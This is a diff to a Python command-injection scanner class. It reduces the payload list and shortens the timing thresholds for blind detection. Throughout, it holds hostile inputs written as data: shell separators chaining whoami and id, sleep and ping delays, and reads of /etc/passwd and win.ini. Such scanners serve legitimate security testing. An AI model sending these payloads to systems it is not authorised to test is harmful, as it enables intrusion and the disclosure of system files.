@@ -18,44 +18,24 @@ class CommandInjectionScanner:
     Tests for OS command injection using various techniques
     """
     
-    # Command injection payloads for different OS
+    # Command injection payloads for different OS (optimized)
     CMD_PAYLOADS = [
         # Unix/Linux command separators
         "; whoami",
         "| whoami",
-        "|| whoami",
-        "& whoami",
         "&& whoami",
-        "`whoami`",
-        "$(whoami)",
         "; id",
-        "| id",
-        "&& id",
         
         # Windows command separators
         "& whoami",
-        "&& whoami",
-        "| whoami",
-        "|| whoami",
         
         # Time-based detection (blind)
-        "; sleep 5",
-        "| sleep 5",
-        "&& sleep 5",
-        "; ping -c 5 127.0.0.1",
-        "& ping -n 5 127.0.0.1",
+        "; sleep 3",
+        "| sleep 3",
+        "& ping -n 3 127.0.0.1",
         
         # File read attempts
-        "; cat /etc/passwd",
-        "| cat /etc/passwd",
-        "&& cat /etc/passwd",
-        "& type C:\\windows\\win.ini",
-        
-        # Command substitution
-        "`id`",
-        "$(id)",
-        "`whoami`",
-        "$(whoami)"
+        "; cat /etc/passwd"
     ]
     
     # Evidence patterns to look for in responses
@@ -69,7 +49,7 @@ class CommandInjectionScanner:
         r"for 16-bit app support",  # win.ini content
     ]
     
-    def __init__(self, timeout: int = 10):
+    def __init__(self, timeout: int = 5):
         """
         Initialize Command Injection Scanner
         
@@ -164,11 +144,9 @@ class CommandInjectionScanner:
         vulnerabilities = []
         
         time_payloads = [
-            "; sleep 5",
-            "| sleep 5", 
-            "&& sleep 5",
-            "& ping -n 5 127.0.0.1",
-            "; ping -c 5 127.0.0.1"
+            "; sleep 3",
+            "| sleep 3",
+            "& ping -n 3 127.0.0.1"
         ]
         
         for payload in time_payloads:
@@ -180,14 +158,14 @@ class CommandInjectionScanner:
                 start_time = time.time()
                 
                 if method.upper() == "POST":
-                    response = self.session.post(url, data=test_params, timeout=15, verify=False)
+                    response = self.session.post(url, data=test_params, timeout=8, verify=False)
                 else:
-                    response = self.session.get(url, params=test_params, timeout=15, verify=False)
+                    response = self.session.get(url, params=test_params, timeout=8, verify=False)
                 
                 elapsed = time.time() - start_time
                 
-                # If response took significantly longer (4+ seconds), likely vulnerable
-                if elapsed > 4:
+                # If response took significantly longer (2.5+ seconds), likely vulnerable
+                if elapsed > 2.5:
                     vulnerabilities.append({
                         'type': 'OS Command Injection (Time-Based Blind)',
                         'url': url,
